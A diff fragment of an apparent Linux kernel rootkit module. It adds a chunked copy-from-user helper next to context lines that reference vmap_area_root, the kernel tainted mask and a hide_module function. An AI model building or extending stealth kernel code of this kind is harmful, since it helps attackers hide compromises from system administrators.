@@ -33,6 +33,24 @@ static struct rb_root *p_vma_root   = NULL; // Pointer to `vmap_area_root`
 
 static unsigned long *p_tainted_mask = NULL;
 
+#define COPY_CHUNK_SIZE (16 * PAGE_SIZE)
+
+// Taken from kernel/module.c:3103
+int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long ui64_len)
+{
+    do {
+        unsigned long n = min(ui64_len, COPY_CHUNK_SIZE);
+
+        if (copy_from_user(p_dst, p_usrc, n) != 0)
+            return -EFAULT;
+        cond_resched();
+        p_dst += n;
+        p_usrc += n;
+        ui64_len -= n;
+    } while (ui64_len);
+    return 0;
+}
+
 void hide_module(void)
 {
     unsigned int i = 0;
